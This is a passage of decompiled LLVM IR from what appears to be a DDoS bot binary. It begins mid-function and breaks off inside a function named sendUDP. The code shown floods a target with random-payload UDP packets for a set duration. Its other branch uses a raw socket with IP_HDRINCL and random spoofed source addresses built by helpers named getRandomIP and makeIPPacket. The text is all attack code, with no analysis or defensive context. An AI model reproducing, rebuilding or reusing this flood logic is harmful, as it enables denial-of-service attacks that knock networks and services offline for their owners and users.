%dec_label_pc_804a617 ], [ %stack_var_-240.261, %dec_label_pc_804a5e4 ], [ %stack_var_-240.261, %dec_label_pc_804a49a ]
  %stack_var_-244.1 = phi i8* [ %stack_var_-244.263, %dec_label_pc_804a2fa ], [ %stack_var_-244.263, %dec_label_pc_804b6ee ], [ %stack_var_-244.263, %dec_label_pc_804b717 ], [ %stack_var_-244.263, %dec_label_pc_804b679 ], [ %v5_804b44d, %dec_label_pc_804b5cc ], [ %v5_804b44d, %dec_label_pc_804b59f ], [ %v5_804b44d, %dec_label_pc_804b51c ], [ %v5_804b44d, %dec_label_pc_804b499 ], [ %stack_var_-244.263, %dec_label_pc_804b384 ], [ %stack_var_-244.263, %dec_label_pc_804b3fc ], [ %stack_var_-244.263, %dec_label_pc_804b33a ], [ %stack_var_-244.263, %dec_label_pc_804b2c2 ], [ %stack_var_-244.263, %dec_label_pc_804b228 ], [ %stack_var_-244.263, %dec_label_pc_804b0f3 ], [ %stack_var_-244.263, %dec_label_pc_804b0ac ], [ %stack_var_-244.263, %dec_label_pc_804b02f ], [ %stack_var_-244.263, %dec_label_pc_804aee9 ], [ %stack_var_-244.263, %dec_label_pc_804af61 ], [ %stack_var_-244.263, %dec_label_pc_804aea2 ], [ %stack_var_-244.263, %dec_label_pc_804adbb ], [ %stack_var_-244.263, %dec_label_pc_804ace3 ], [ %stack_var_-244.263, %dec_label_pc_804ac9c ], [ %stack_var_-244.263, %dec_label_pc_804ac1f ], [ %stack_var_-244.263, %dec_label_pc_804aad9 ], [ %stack_var_-244.263, %dec_label_pc_804ab51 ], [ %stack_var_-244.263, %dec_label_pc_804aa5c ], [ %stack_var_-244.263, %dec_label_pc_804a8f7 ], [ %stack_var_-244.263, %dec_label_pc_804a924 ], [ %stack_var_-244.263, %dec_label_pc_804a7da ], [ %stack_var_-244.263, %dec_label_pc_804a4b3 ], [ %stack_var_-244.263, %dec_label_pc_804a617 ], [ %stack_var_-244.263, %dec_label_pc_804a5e4 ], [ %stack_var_-244.263, %dec_label_pc_804a49a ]
  %stack_var_-248.1 = phi i8* [ %stack_var_-248.265, %dec_label_pc_804a2fa ], [ %stack_var_-248.265, %dec_label_pc_804b6ee ], [ %stack_var_-248.265, %dec_label_pc_804b717 ], [ %stack_var_-248.265, %dec_label_pc_804b679 ], [ %v5_804b4d0, %dec_label_pc_804b5cc ], [ %v5_804b4d0, %dec_label_pc_804b59f ], [ %v5_804b4d0, %dec_label_pc_804b51c ], [ %stack_var_-248.265, %dec_label_pc_804b499 ], [ %stack_var_-248.265, %dec_label_pc_804b384 ], [ %stack_var_-248.265, %dec_label_pc_804b3fc ], [ %stack_var_-248.265, %dec_label_pc_804b33a ], [ %stack_var_-248.265, %dec_label_pc_804b2c2 ], [ %stack_var_-248.265, %dec_label_pc_804b228 ], [ %stack_var_-248.265, %dec_label_pc_804b0f3 ], [ %stack_var_-248.265, %dec_label_pc_804b0ac ], [ %stack_var_-248.265, %dec_label_pc_804b02f ], [ %stack_var_-248.265, %dec_label_pc_804aee9 ], [ %stack_var_-248.265, %dec_label_pc_804af61 ], [ %stack_var_-248.265, %dec_label_pc_804aea2 ], [ %stack_var_-248.265, %dec_label_pc_804adbb ], [ %stack_var_-248.265, %dec_label_pc_804ace3 ], [ %stack_var_-248.265, %dec_label_pc_804ac9c ], [ %stack_var_-248.265, %dec_label_pc_804ac1f ], [ %stack_var_-248.265, %dec_label_pc_804aad9 ], [ %stack_var_-248.265, %dec_label_pc_804ab51 ], [ %stack_var_-248.265, %dec_label_pc_804aa5c ], [ %stack_var_-248.265, %dec_label_pc_804a8f7 ], [ %stack_var_-248.265, %dec_label_pc_804a924 ], [ %stack_var_-248.265, %dec_label_pc_804a7da ], [ %stack_var_-248.265, %dec_label_pc_804a4b3 ], [ %stack_var_-248.265, %dec_label_pc_804a617 ], [ %stack_var_-248.265, %dec_label_pc_804a5e4 ], [ %stack_var_-248.265, %dec_label_pc_804a49a ]
  %stack_var_-252.1 = phi i8* [ %stack_var_-252.267, %dec_label_pc_804a2fa ], [ %stack_var_-252.267, %dec_label_pc_804b6ee ], [ %stack_var_-252.267, %dec_label_pc_804b717 ], [ %stack_var_-252.267, %dec_label_pc_804b679 ], [ %v5_804b553, %dec_label_pc_804b5cc ], [ %v5_804b553, %dec_label_pc_804b59f ], [ %stack_var_-252.267, %dec_label_pc_804b51c ], [ %stack_var_-252.267, %dec_label_pc_804b499 ], [ %stack_var_-252.267, %dec_label_pc_804b384 ], [ %stack_var_-252.267, %dec_label_pc_804b3fc ], [ %stack_var_-252.267, %dec_label_pc_804b33a ], [ %stack_var_-252.267, %dec_label_pc_804b2c2 ], [ %stack_var_-252.267, %dec_label_pc_804b228 ], [ %stack_var_-252.267, %dec_label_pc_804b0f3 ], [ %stack_var_-252.267, %dec_label_pc_804b0ac ], [ %stack_var_-252.267, %dec_label_pc_804b02f ], [ %stack_var_-252.267, %dec_label_pc_804aee9 ], [ %stack_var_-252.267, %dec_label_pc_804af61 ], [ %stack_var_-252.267, %dec_label_pc_804aea2 ], [ %stack_var_-252.267, %dec_label_pc_804adbb ], [ %stack_var_-252.267, %dec_label_pc_804ace3 ], [ %stack_var_-252.267, %dec_label_pc_804ac9c ], [ %stack_var_-252.267, %dec_label_pc_804ac1f ], [ %stack_var_-252.267, %dec_label_pc_804aad9 ], [ %stack_var_-252.267, %dec_label_pc_804ab51 ], [ %stack_var_-252.267, %dec_label_pc_804aa5c ], [ %stack_var_-252.267, %dec_label_pc_804a8f7 ], [ %stack_var_-252.267, %dec_label_pc_804a924 ], [ %stack_var_-252.267, %dec_label_pc_804a7da ], [ %stack_var_-252.267, %dec_label_pc_804a4b3 ], [ %stack_var_-252.267, %dec_label_pc_804a617 ], [ %stack_var_-252.267, %dec_label_pc_804a5e4 ], [ %stack_var_-252.267, %dec_label_pc_804a49a ]
  %v4_804b759 = add nuw nsw i32 %v1_804a42569, 1
  store i32 %v4_804b759, i32* %eax.global-to-local, align 4
  %v5_804b762 = icmp slt i32 %v4_804b759, %.v2_804a1b4
  br i1 %v5_804b762, label %dec_label_pc_804a2fa, label %dec_label_pc_804a2ee

; uselistorder directives
  uselistorder i32 %v4_804b759, { 2, 1, 0 }
  uselistorder i8* %stack_var_-252.1, { 1, 0 }
  uselistorder i8* %stack_var_-248.1, { 1, 0 }
  uselistorder i8* %stack_var_-244.1, { 1, 0 }
  uselistorder i32 %stack_var_-240.1, { 1, 0 }
  uselistorder i32 %stack_var_-236.1, { 1, 0 }
  uselistorder i32 %stack_var_-232.1, { 1, 0 }
  uselistorder i32 %stack_var_-228.1, { 1, 0 }
  uselistorder i32 %stack_var_-224.1, { 1, 0 }
  uselistorder i32 %v2_804b39b, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i8* %v1_804b2b9, { 1, 0, 2 }
  uselistorder i32 %v2_804b2b4, { 1, 0, 2 }
  uselistorder i32 %v0_804b088, { 1, 0 }
  uselistorder i32 %v4_804afbf, { 0, 2, 4, 3, 5, 1, 6, 7, 8, 9 }
  uselistorder i32 %v2_804af00, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32 %v0_804ac78, { 1, 0 }
  uselistorder i32 %v4_804abaf, { 0, 2, 4, 3, 5, 1, 6, 7, 8, 9 }
  uselistorder i32 %v2_804aaf0, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32 %v0_804a7ec, { 1, 0 }
  uselistorder i32 %v5_804a725, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804a6ca, { 1, 0 }
  uselistorder i32 %v2_804a6b5, { 1, 0 }
  uselistorder i32 %v1_804a4f9, { 1, 0 }
  uselistorder i32* %v3_804a543.pre-phi, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_804a3fc, { 1, 0 }
  uselistorder i32 %v2_804a394, { 0, 2, 1 }
  uselistorder i32 %v2_804a342, { 2, 0, 1, 4, 3, 5 }
  uselistorder i32 %v6_804a309, { 5, 4, 3, 2, 1, 0, 7, 6, 8 }
  uselistorder i8* %v4_804a309, { 25, 26, 21, 22, 23, 24, 17, 18, 19, 20, 14, 15, 16, 11, 12, 13, 8, 9, 10, 5, 6, 7, 1, 2, 3, 4, 0, 27 }
  uselistorder i32 %v2_804a306, { 0, 38, 37, 1, 36, 35, 2, 3, 45, 44, 43, 4, 42, 41, 5, 40, 6, 39, 7, 53, 52, 8, 51, 50, 49, 9, 48, 47, 46, 10, 11, 60, 59, 12, 58, 57, 14, 56, 55, 13, 54, 15, 65, 64, 16, 63, 62, 61, 17, 18, 72, 71, 19, 70, 69, 21, 68, 67, 20, 66, 22, 77, 76, 75, 74, 73, 23, 24, 89, 88, 25, 87, 86, 85, 84, 26, 83, 82, 81, 80, 79, 78, 27, 102, 101, 100, 99, 98, 97, 96, 95, 94, 28, 93, 29, 92, 30, 91, 31, 90, 32, 33, 34 }
  uselistorder i32 %stack_var_-224.253, { 37, 0, 1, 2, 36, 35, 34, 33, 32, 31, 30, 27, 24, 23, 22, 20, 19, 18, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 17, 16, 21, 26, 25, 29, 28 }
  uselistorder i32 %stack_var_-228.255, { 38, 0, 1, 2, 37, 36, 35, 34, 33, 32, 31, 28, 26, 25, 23, 22, 21, 18, 16, 14, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 13, 15, 17, 20, 19, 27, 24, 30, 29 }
  uselistorder i32 %stack_var_-232.257, { 37, 0, 1, 2, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 20, 18, 16, 13, 12, 11, 10, 9, 8, 6, 5, 4, 3, 7, 15, 17, 19, 14, 22, 21 }
  uselistorder i32 %stack_var_-236.259, { 36, 0, 1, 2, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 19, 17, 14, 13, 12, 11, 10, 9, 6, 5, 4, 3, 8, 7, 18, 16, 21, 20, 15 }
  uselistorder i32 %stack_var_-240.261, { 33, 0, 1, 2, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 6, 5, 4, 3, 9, 8, 7 }
  uselistorder i8* %stack_var_-244.263, { 29, 0, 1, 2, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 3, 4 }
  uselistorder i8* %stack_var_-248.265, { 30, 0, 1, 2, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 3, 4 }
  uselistorder i8* %stack_var_-252.267, { 31, 0, 1, 2, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 3, 4 }
  uselistorder i32 %v1_804a42569, { 0, 12, 11, 13, 10, 9, 14, 8, 19, 18, 17, 20, 16, 21, 15, 30, 29, 28, 26, 27, 34, 36, 35, 33, 38, 37, 32, 31, 25, 24, 23, 39, 22, 45, 44, 46, 43, 42, 41, 40, 57, 56, 55, 53, 54, 58, 52, 60, 59, 51, 50, 49, 48, 61, 47, 67, 66, 68, 65, 64, 63, 62, 78, 77, 76, 74, 75, 80, 79, 73, 72, 71, 81, 70, 82, 69, 89, 88, 87, 91, 90, 96, 95, 94, 97, 93, 92, 86, 85, 84, 98, 83, 3, 1, 2, 4, 5, 6, 106, 105, 104, 107, 103, 108, 102, 109, 101, 100, 99, 110, 7 }
  uselistorder i32 %v4_804a2e3, { 1, 0, 2 }
  uselistorder i32 %v2_804a286, { 1, 0, 2 }
  uselistorder i32 %storemerge586, { 5, 4, 3, 2, 1, 6, 0 }
  uselistorder i32 %v2_804a289, { 1, 0, 4, 3, 2, 7, 6, 5, 9, 8, 11, 10, 13, 12, 14, 16, 17, 15, 18, 19 }
  uselistorder i32 %v2_804a262, { 1, 0 }
  uselistorder i32 %v2_804a245, { 4, 23, 5, 6, 7, 24, 8, 9, 10, 25, 11, 27, 26, 12, 13, 28, 14, 15, 29, 16, 17, 18, 30, 19, 31, 1, 2, 3, 20, 32, 0, 21, 22 }
  uselistorder i32 %.v2_804a1b4, { 4, 5, 7, 6, 3, 0, 1, 2 }
  uselistorder i32 %v2_804a1b4, { 2, 1, 0 }
  uselistorder i32* %stack_var_-204, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-172, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-180, { 2, 1, 5, 4, 0, 3, 6, 7 }
  uselistorder i32* %stack_var_-184, { 2, 1, 4, 3, 0, 5, 6 }
  uselistorder i32* %stack_var_-188, { 2, 4, 6, 3, 1, 8, 7, 5, 9, 0, 10, 11 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 3, 4, 5, 2, 6, 7, 9, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 27, 23, 29, 30, 31, 32, 28, 33, 106, 107, 108, 109, 111, 112, 110, 114, 113, 115, 116, 118, 117, 119, 120, 121, 122, 123, 125, 126, 127, 128, 124, 129, 34, 35, 36, 38, 39, 37, 41, 40, 42, 43, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 60, 59, 61, 62, 63, 64, 65, 66, 67, 68, 69, 71, 70, 72, 73, 74, 75, 76, 77, 78, 79, 80, 82, 81, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 95, 96, 97, 98, 99, 100, 101, 102, 94, 103, 104, 105, 138, 130, 131, 132, 133, 134, 135, 136, 137 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 232, 0, 1, 2, 5, 3, 4, 9, 7, 8, 10, 6, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 27, 25, 26, 28, 29, 30, 33, 31, 32, 34, 35, 36, 37, 38, 41, 39, 40, 42, 43, 46, 44, 45, 48, 49, 50, 51, 52, 47, 55, 56, 57, 58, 53, 54, 59, 60, 61, 181, 179, 180, 182, 183, 184, 185, 186, 187, 189, 190, 188, 191, 194, 192, 193, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 208, 206, 207, 209, 210, 211, 212, 213, 217, 214, 215, 216, 221, 219, 220, 222, 223, 224, 218, 225, 226, 227, 228, 62, 63, 64, 65, 67, 68, 66, 69, 72, 70, 71, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 86, 84, 85, 87, 88, 89, 90, 91, 94, 92, 93, 95, 96, 97, 98, 101, 99, 100, 102, 103, 104, 105, 106, 107, 110, 108, 109, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 123, 121, 122, 124, 125, 127, 126, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 144, 142, 143, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 163, 176, 177, 178, 229, 230, 231, 239, 236, 233, 234, 235, 240, 237, 238 }
  uselistorder i32 ()* @readUntil, { 1, 0, 2 }
  uselistorder i32 (i32)* @sclose, { 15, 14, 13, 12, 11, 3, 2, 1, 0, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i8 7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b759, { 32, 1, 7, 8, 9, 10, 11, 12, 2, 13, 14, 15, 26, 27, 28, 29, 6, 30, 31, 16, 17, 18, 19, 3, 20, 21, 4, 22, 23, 24, 5, 25, 0 }
  uselistorder label %dec_label_pc_804b623, { 1, 0 }
  uselistorder label %dec_label_pc_804b14a, { 1, 0 }
  uselistorder label %dec_label_pc_804ad3a, { 1, 0 }
  uselistorder label %dec_label_pc_804a9df, { 1, 0 }
  uselistorder label %dec_label_pc_804a9a9, { 1, 0 }
  uselistorder label %dec_label_pc_804a8f7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804a688, { 1, 0 }
  uselistorder label %dec_label_pc_804a482, { 1, 0 }
  uselistorder label %dec_label_pc_804a2fa, { 1, 0 }
  uselistorder label %dec_label_pc_804a2ee, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804a2ee.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804a27a, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16 @__decompiler_undefined_function_4()
  %tmp23 = call i16 @__decompiler_undefined_function_4()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %v0_804b770 = load i32, i32* @edi, align 4
  %v0_804b771 = load i32, i32* @ebx, align 4
  %v13_804b772 = ptrtoint i32* %stack_var_-140 to i32
  store i32 2, i32* %stack_var_-68, align 4
  %v4_804b77b = icmp eq i32 %arg2, 0
  %v1_804b77f = icmp eq i1 %v4_804b77b, false
  br i1 %v1_804b77f, label %dec_label_pc_804b78f, label %dec_label_pc_804b781

dec_label_pc_804b781:                             ; preds = %entry
  %v1_804b781 = call i32 @rand_cmwc(i32 2)
  br label %dec_label_pc_804b7a4

dec_label_pc_804b78f:                             ; preds = %entry
  %v1_804b792 = urem i32 %arg2, 65536
  store i32 %v1_804b792, i32* %eax.global-to-local, align 4
  store i32 %v1_804b792, i32* %stack_var_-140, align 4
  %v1_804b798 = trunc i32 %arg2 to i16
  %v2_804b798 = call i32 @htons(i16 %v1_804b798)
  br label %dec_label_pc_804b7a4

dec_label_pc_804b7a4:                             ; preds = %dec_label_pc_804b781, %dec_label_pc_804b78f
  %v2_804b7a4 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %stack_var_-140, align 4
  %v3_804b7b4 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  store i32 %v3_804b7b4, i32* %eax.global-to-local, align 4
  %v1_804b7b9 = icmp eq i32 %v3_804b7b4, 0
  %v1_804b7bb = icmp eq i1 %v1_804b7b9, false
  br i1 %v1_804b7bb, label %dec_label_pc_804bbc1, label %dec_label_pc_804b7c1

dec_label_pc_804b7c1:                             ; preds = %dec_label_pc_804b7a4
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v9_804b7da = icmp eq i32 %arg4, 32
  %v1_804b7de = icmp eq i1 %v9_804b7da, false
  br i1 %v1_804b7de, label %dec_label_pc_804b8d2, label %dec_label_pc_804b7e4

dec_label_pc_804b7e4:                             ; preds = %dec_label_pc_804b7c1
  store i32 2, i32* %stack_var_-140, align 4
  %v3_804b7fb = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v3_804b7fb, i32* %eax.global-to-local, align 4
  %v4_804b803 = icmp eq i32 %v3_804b7fb, 0
  br i1 %v4_804b803, label %dec_label_pc_804bbc1, label %dec_label_pc_804b80d

dec_label_pc_804b80d:                             ; preds = %dec_label_pc_804b7e4
  %v1_804b810 = add i32 %arg5, 1
  store i32 %v1_804b810, i32* %eax.global-to-local, align 4
  store i32 %v1_804b810, i32* %stack_var_-140, align 4
  %v1_804b814 = call i32 @malloc(i32 %v1_804b810)
  store i32 %v1_804b814, i32* %eax.global-to-local, align 4
  %v4_804b81c = icmp eq i32 %v1_804b814, 0
  br i1 %v4_804b81c, label %dec_label_pc_804bbc1, label %dec_label_pc_804b826

dec_label_pc_804b826:                             ; preds = %dec_label_pc_804b80d
  store i32 %v1_804b810, i32* %edx.global-to-local, align 4
  %v1_804b82f = inttoptr i32 %v1_804b814 to i8*
  store i32 %v1_804b814, i32* @edi, align 4
  %v1_804b834 = and i32 %v1_804b814, -256
  store i32 %v1_804b834, i32* %eax.global-to-local, align 4
  %v5_804b836 = call i8* @_memset(i8* %v1_804b82f, i32 %v1_804b834, i32 %v1_804b810)
  store i32 %v1_804b814, i32* %eax.global-to-local, align 4
  store i32 %v1_804b814, i32* %stack_var_-140, align 4
  %v3_804b845 = call i32 @makeRandomStr(i8* %v1_804b82f, i32 %arg5)
  store i32 %v3_804b845, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-140, align 4
  %v2_804b851 = call i32 @__GI_time(i32* null)
  %v5_804b856 = add i32 %v2_804b851, %arg3
  store i32 %v5_804b856, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b865

dec_label_pc_804b865:                             ; preds = %dec_label_pc_804b8af, %dec_label_pc_804b8cd, %dec_label_pc_804b826
  %stack_var_-84.0 = phi i32 [ 0, %dec_label_pc_804b826 ], [ %v4_804b8cd, %dec_label_pc_804b8cd ], [ 0, %dec_label_pc_804b8af ]
  store i32 %arg5, i32* %edx.global-to-local, align 4
  store i32 %v3_804b7fb, i32* %eax.global-to-local, align 4
  store i32 %v3_804b7fb, i32* %stack_var_-140, align 4
  %v6_804b890 = call i32 @__libc_sendto(i32 %v3_804b7fb, i32 %v1_804b814, i32 %arg5, i32 0, i32 %v2_804b7a4, i32 16)
  store i32 %v6_804b890, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* %edx.global-to-local, align 4
  %v15_804b898 = icmp eq i32 %stack_var_-84.0, %arg6
  %v1_804b89b = icmp eq i1 %v15_804b898, false
  br i1 %v1_804b89b, label %dec_label_pc_804b8cd, label %dec_label_pc_804b89d

dec_label_pc_804b89d:                             ; preds = %dec_label_pc_804b865
  br i1 %v1_804b77f, label %dec_label_pc_804b8af, label %dec_label_pc_804b8a3

dec_label_pc_804b8a3:                             ; preds = %dec_label_pc_804b89d
  %v0_804b8a3 = load i32, i32* %stack_var_-140, align 4
  %v1_804b8a3 = call i32 @rand_cmwc(i32 %v0_804b8a3)
  %v1_804b8a8 = urem i32 %v1_804b8a3, 65536
  store i32 %v1_804b8a8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b8af

dec_label_pc_804b8af:                             ; preds = %dec_label_pc_804b89d, %dec_label_pc_804b8a3
  store i32 0, i32* %stack_var_-140, align 4
  %v2_804b8b6 = call i32 @__GI_time(i32* null)
  store i32 %v2_804b8b6, i32* %eax.global-to-local, align 4
  %v8_804b8be = icmp sgt i32 %v2_804b8b6, %v5_804b856
  br i1 %v8_804b8be, label %dec_label_pc_804bbc1, label %dec_label_pc_804b865

dec_label_pc_804b8cd:                             ; preds = %dec_label_pc_804b865
  %v4_804b8cd = add i32 %stack_var_-84.0, 1
  br label %dec_label_pc_804b865

dec_label_pc_804b8d2:                             ; preds = %dec_label_pc_804b7c1
  store i32 %v13_804b772, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-140, align 4
  %v3_804b8ee = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_804b8ee, i32* %eax.global-to-local, align 4
  %v4_804b8f6 = icmp eq i32 %v3_804b8ee, 0
  %v1_804b8fa = icmp eq i1 %v4_804b8f6, false
  br i1 %v1_804b8fa, label %dec_label_pc_804b901, label %dec_label_pc_804bbbe

dec_label_pc_804b901:                             ; preds = %dec_label_pc_804b8d2
  store i32 1, i32* %stack_var_-72, align 4
  %v2_804b910 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v3_804b8ee, i32* %eax.global-to-local, align 4
  store i32 %v3_804b8ee, i32* %stack_var_-140, align 4
  %v5_804b92d = call i32 @__GI_setsockopt(i32 %v3_804b8ee, i32 0, i32 3, i32 %v2_804b910, i32 4)
  store i32 %v5_804b92d, i32* %eax.global-to-local, align 4
  %v2_804b932 = icmp slt i32 %v5_804b92d, 0
  %v1_804b934 = icmp eq i1 %v2_804b932, false
  br i1 %v1_804b934, label %dec_label_pc_804b96e.preheader, label %dec_label_pc_804bbbe

dec_label_pc_804b96e.preheader:                   ; preds = %dec_label_pc_804b901
  br label %dec_label_pc_804b944

dec_label_pc_804b944:                             ; preds = %dec_label_pc_804b96e.preheader, %dec_label_pc_804b944
  %v4_804b96e61 = phi i32 [ 49, %dec_label_pc_804b96e.preheader ], [ %v4_804b96e, %dec_label_pc_804b944 ]
  store i32 0, i32* %stack_var_-140, align 4
  %v2_804b94b = call i32 @__GI_time(i32* null)
  store i32 %v2_804b94b, i32* %eax.global-to-local, align 4
  store i32 %v2_804b94b, i32* @ebx, align 4
  %v0_804b952 = load i32, i32* %stack_var_-140, align 4
  %v1_804b952 = call i32 @rand_cmwc(i32 %v0_804b952)
  %v1_804b957 = load i32, i32* @ebx, align 4
  %v2_804b957 = xor i32 %v1_804b957, %v1_804b952
  store i32 %v2_804b957, i32* @eax, align 4
  store i32 %v2_804b957, i32* %stack_var_-140, align 4
  %v1_804b95c = call i32 @srand(i32 %v2_804b957)
  store i32 %v1_804b95c, i32* @eax, align 4
  %v0_804b961 = call i32 @random()
  store i32 %v0_804b961, i32* %eax.global-to-local, align 4
  store i32 %v0_804b961, i32* %stack_var_-140, align 4
  %v1_804b969 = call i32 @init_rand(i32 %v0_804b961)
  store i32 %v1_804b969, i32* %eax.global-to-local, align 4
  %v4_804b96e = add nsw i32 %v4_804b96e61, -1
  %v13_804b971 = icmp eq i32 %v4_804b96e61, 0
  %v1_804b975 = icmp eq i1 %v13_804b971, false
  br i1 %v1_804b975, label %dec_label_pc_804b944, label %dec_label_pc_804b977

dec_label_pc_804b977:                             ; preds = %dec_label_pc_804b944
  %v4_804b977 = icmp eq i32 %arg4, 0
  %v1_804b97b = icmp eq i1 %v4_804b977, false
  br i1 %v1_804b97b, label %dec_label_pc_804b986, label %dec_label_pc_804b99c

dec_label_pc_804b986:                             ; preds = %dec_label_pc_804b977
  %v5_804b98d = sub i32 32, %arg4
  %v2_804b995 = urem i32 %v5_804b98d, 32
  %v4_804b995 = icmp eq i32 %v2_804b995, 0
  br i1 %v4_804b995, label %bb60, label %bb

bb:                                               ; preds = %dec_label_pc_804b986
  %v5_804b995 = shl i32 1, %v2_804b995
  br label %bb60

bb60:                                             ; preds = %dec_label_pc_804b986, %bb
  %v0_804b997 = phi i32 [ %v5_804b995, %bb ], [ 1, %dec_label_pc_804b986 ]
  %v1_804b997 = sub i32 0, %v0_804b997
  store i32 %v1_804b997, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b99c

dec_label_pc_804b99c:                             ; preds = %dec_label_pc_804b977, %bb60
  %storemerge6 = phi i32 [ %v1_804b997, %bb60 ], [ 0, %dec_label_pc_804b977 ]
  %v1_804b99f = add i32 %arg5, 28
  %v1_804b9ab = add i32 %arg5, 58
  %v2_804b9ae = and i32 %v1_804b9ab, -16
  %v0_804b9b4 = load i32, i32* @esp, align 4
  %v2_804b9b4 = sub i32 %v0_804b9b4, %v2_804b9ae
  %v1_804b9c0 = add i32 %v2_804b9b4, 39
  %v2_804b9c3 = and i32 %v1_804b9c0, -16
  store i32 %v2_804b9c3, i32* %edx.global-to-local, align 4
  %v1_804b9db = add i32 %v2_804b9c3, 20
  %v5_804b9de = inttoptr i32 %v1_804b9db to i16*
  %v1_804b9e4 = add i32 %arg5, 8
  store i32 %v1_804b9e4, i32* @ebx, align 4
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_804b9ec = inttoptr i32 %v2_804b9b4 to i32*
  store i32 %storemerge6, i32* %v2_804b9ec, align 4
  %v2_804b9ef = call i32 @getRandomIP(i32 %v1_804b99f, i32 %v2_804b9c3)
  store i32 %v2_804b9ef, i32* %eax.global-to-local, align 4
  %v1_804b9f4 = load i32, i32* @esp, align 4
  %v2_804b9f4 = inttoptr i32 %v1_804b9f4 to i32*
  store i32 %v2_804b9ef, i32* %v2_804b9f4, align 4
  %v0_804b9f7 = call i32 @htonl()
  %v3_804b9fc = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_804b9fc, i32* %edx.global-to-local, align 4
  %v0_804b9ff = load i32, i32* @ebx, align 4
  %v1_804b9ff = load i32, i32* @esp, align 4
  %v2_804b9ff = add i32 %v1_804b9ff, 16
  %v3_804b9ff = inttoptr i32 %v2_804b9ff to i32*
  store i32 %v0_804b9ff, i32* %v3_804b9ff, align 4
  %v0_804ba03 = load i32, i32* @esp, align 4
  %v1_804ba03 = add i32 %v0_804ba03, 12
  %v2_804ba03 = inttoptr i32 %v1_804ba03 to i32*
  store i32 17, i32* %v2_804ba03, align 4
  %v1_804ba0b = load i32, i32* @esp, align 4
  %v2_804ba0b = add i32 %v1_804ba0b, 8
  %v3_804ba0b = inttoptr i32 %v2_804ba0b to i32*
  store i32 %v0_804b9f7, i32* %v3_804ba0b, align 4
  %v0_804ba0f = load i32, i32* %edx.global-to-local, align 4
  %v1_804ba0f = load i32, i32* @esp, align 4
  %v2_804ba0f = add i32 %v1_804ba0f, 4
  %v3_804ba0f = inttoptr i32 %v2_804ba0f to i32*
  store i32 %v0_804ba0f, i32* %v3_804ba0f, align 4
  store i32 %v2_804b9c3, i32* %eax.global-to-local, align 4
  %v1_804ba16 = load i32, i32* @esp, align 4
  %v2_804ba16 = inttoptr i32 %v1_804ba16 to i32*
  store i32 %v2_804b9c3, i32* %v2_804ba16, align 4
  %v0_804ba19 = call i32 @makeIPPacket()
  %v1_804ba27 = urem i32 %v1_804b9e4, 65536
  store i32 %v1_804ba27, i32* %eax.global-to-local, align 4
  %v1_804ba2a = load i32, i32* @esp, align 4
  %v2_804ba2a = inttoptr i32 %v1_804ba2a to i32*
  store i32 %v1_804ba27, i32* %v2_804ba2a, align 4
  %v2_804ba2d = trunc i32 %v1_804b9db to i16
